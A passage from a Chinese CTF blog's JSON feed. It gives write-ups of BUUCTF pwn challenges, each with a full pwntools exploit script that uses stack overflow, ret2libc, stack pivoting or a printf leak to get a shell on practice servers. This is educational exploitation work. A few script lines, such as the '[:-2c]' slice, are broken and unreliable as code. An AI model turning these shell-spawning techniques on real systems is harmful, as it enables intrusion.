punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一点是该程序里有个 sprintf 进行字符串转移，所以转移时会被’\\0’截断，并且切断后还会加个回车字符。所以地址只能取 s 变量处的而不能取 format 处的。之前 32 位程序代码几乎一样，但是我读取的是 format 处的字符串，所以迁移程序的时候卡了好久。</p>\n<p>这个程序迁移回 32 位就简单多了。</p>\n<h2 id=\"hitcontraining_magicheap\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_magicheap\">#</a> hitcontraining_magicheap</h2>\n",
            "tags": [
                "heap",
                "stack migration"
            ]
        },
        {
            "id": "http://waltcsz.github.io/PWN/Write-Up/buu-0824-67d29d4ef03a/",
            "url": "http://waltcsz.github.io/PWN/Write-Up/buu-0824-67d29d4ef03a/",
            "title": "buu 0824",
            "date_published": "2023-08-26T10:49:26.000Z",
            "content_html": "<h2 id=\"other_shellcode-1\"><a class=\"markdownIt-Anchor\" href=\"#other_shellcode-1\">#</a> other_shellcode 1</h2>\n<p>这题直连就是 getshell，大概就是介绍一下系统调用这玩意</p>\n<p><img data-src=\"./image-20230826184740060.png\" alt=\"image-20230826184740060\" style=\"zoom:25%;\" /><img data-src=\"./image-20230826184800160.png\" alt=\"image-20230826184800160\"></p>\n<h2 id=\"not_the_same_3dsctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#not_the_same_3dsctf_2016\">#</a> not_the_same_3dsctf_2016</h2>\n<p>主函数即给了 gets 用于栈溢出，先利用后门函数 get_secret () 将 flag 写入内存，之后用 write 函数输出 flag。</p>\n<p>代码如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./not_the_same_3dsctf_2016')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">29076</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./not_the_same_3dsctf_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>write_plt <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x080489A0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x080ECA2D</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main_addr <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x2D</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_ne_5\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_ne_5\">#</a> *ciscn_2019_ne_5</h2>\n<p>经典菜单程序。getflag 函数中，strcpy (dest, src) 将 src 复制给 dest，此时可以造成溢出。</p>\n<p>在 AddLog 中输入 payload，之后进入 GetFlag 即可实现栈溢出。</p>\n<p>利用 system 函数和 sh 字符串 getshell。</p>\n<p>32 位下 ret2libc 时，若选用的汇编命令为 call system 时，构造 payload 时 system 地址和参数地址之间的返回地址可省略。因为调用 call 指令时会将当前命令地址压入栈中，相当于正常流程中入栈返回地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./ciscn_2019_ne_5')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28585</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>call_sys <span class=\"token operator\">=</span> <span class=\"token number\">0x080486B9</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x080484D0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token operator\">=</span> <span class=\"token number\">0x080482ea</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x8048722</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x48</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>call_sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#该行为使用 call system</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#payload = b'a'*offset + p32(sys) +b'aaaa'+ p32(sh)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#该行为使用 system 的真实地址</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'administrator'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'info:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Exit\\n:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"2018_rop\"><a class=\"markdownIt-Anchor\" href=\"#2018_rop\">#</a> 2018_rop</h2>\n<p>ret2libc3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29613</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./2018_rop')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./2018_rop'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>write<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>main_a<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x088</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lsm_a<span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_es_2\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_2\">#</a> ciscn_2019_es_2</h2>\n<p>这题利用栈迁移。因为栈溢出刚好只能溢出到返回地址，完全不够 payload。</p>\n<p>有两次 read 机会。第一次泄露 ebp 地址，第二次将旧 ebp 修改为字符串起始位置 - 4，返回地址设置为 leave ret 指令的地址，在 main 函数结束时两次 leave ret 即可将栈顶设置为字符串起始。</p>\n<p><img data-src=\"./image-20230826212018947.png\" alt=\"image-20230826212018947\"></p>\n<p><img data-src=\"./image-20230826213000984.png\" alt=\"image-20230826213000984\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./ciscn_2019_es_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25878</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>call_puts <span class=\"token operator\">=</span> <span class=\"token number\">0x0804861D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x08048559</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x080486C0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>hack <span class=\"token operator\">=</span><span class=\"token number\">0x0804854B</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x28</span> <span class=\"token comment\">#before ebp</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x080484b8</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>offset<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ebp <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>new_ebp <span class=\"token operator\">=</span> ebp <span class=\"token operator\">-</span> <span class=\"token number\">0xffffcf98</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xffffcf60</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>new_ebp<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/\\sh\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>new_ebp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"harekazectf2019baby_rop2\"><a class=\"markdownIt-Anchor\" href=\"#harekazectf2019baby_rop2\">#</a> [HarekazeCTF2019]baby_rop2</h2>\n<p>ret2libc</p>\n<p>没有 puts 函数只能用 printf 函数，这时需要一个程序自带的，含有 % s 的字符串。</p>\n<p>这题比较恶心的是 flag 没放在根目录，利用 find -name “flag&quot; 查找文件位置。</p>\n<p><img data-src=\"./image-20230827010409448.png\" alt=\"image-20230827010409448\"></p>\n<p><img data-src=\"./image-20230827010446306.png\" alt=\"image-20230827010446306\"></p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\ncontext(log_level='debug')\n\np=remote('node4.buuoj.cn',29945)\n#p=process('./babyrop2')\n#gdb.attach(p,'b printf')\ne = ELF('./babyrop2')\n\nprintf_p = e.plt['printf']\nlsm_g = e.got['__libc_start_main']\nputs_g = e.got['printf']\n\noffset = 0x020 + 8\n\nmain_a = e.sym['main']\nexit_a = main_a\nprdi = 0x0400733\nrsi_r15_ret = 0x400731\nret = 0x04004d1\nsrc = 0x400770\ndef ready():\n    p.recvuntil(b'What\\'s your name? ')\n\nready()\n\npayload = offset * b'a' + p64(prdi)  + p64(src) + p64(rsi_r15_ret) + p64(lsm_g) + p64(0)+p64(printf_p)+ p64(main_a)\np.sendline(payload)\np.recvuntil(b'!\\nWelcome to the Pwn World again, ')\nlsm_a = u64(p.recvuntil('!\\n')[:-2c].ljust(8,b'\\0'))\n\nprint('the true address of __libc_start_main is %#x'%lsm_a)\n\n\nlibc = ELF('./libc.so.6')\nlibcbase = lsm_a - libc.sym['__libc_start_main']\nsys_a = libcbase + libc.sym['system']\nbs_a = libcbase + next(libc.search(b'/bin/sh'))\n\nready()\npayload = offset * b'a' + p64(ret) + p64(prdi) + p64(bs_a) + p64(sys_a) + p64(exit_a)\np.sendline(payload)\np.interactive()\np.close()\n</code></pre>\n",
            "tags": [
                "stack migration"
            ]
        }
    ]
}